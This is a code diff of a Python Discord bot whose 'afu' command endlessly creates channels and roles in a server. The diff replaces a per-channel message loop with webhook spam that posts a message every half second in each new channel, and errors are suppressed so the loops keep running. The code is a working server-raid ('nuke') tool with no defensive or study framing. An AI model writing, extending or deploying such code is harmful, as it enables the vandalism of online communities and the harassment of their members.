@@ -93,14 +93,25 @@ async def afu(ctx):
     except discord.errors.Forbidden:
         pass
 
-    while True:
-        await guild.create_text_channel(name=f"{name} {random.randint(100,9999)}")
-        await guild.create_role(name=f"{rolename} {random.randint(999,999999)}")
-    
-    
-@bot.event
-async def on_guild_channel_create(channel):
-    while True:
-        await channel.send(msg)
+    async def spam_with_webhook(channel):
+        try:
+            webhook = await channel.create_webhook(name="AFU Webhook")
+            while True:
+                try:
+                    requests.post(webhook.url, json={"content": msg})
+                    await asyncio.sleep(0.5)
+                except:
+                    break
+        except Exception as e:
+            print(f"Webhook failed: {e}")
 
+    while True:
+        try:
+            channel = await guild.create_text_channel(name=f"{name}-{random.randint(100,9999)}")
+            await guild.create_role(name=f"{rolename}-{random.randint(999,999999)}")
+            bot.loop.create_task(spam_with_webhook(channel))
+        except Exception as e:
+            print(f"Loop failed: {e}")
+
+# Run bot
 bot.run(token)
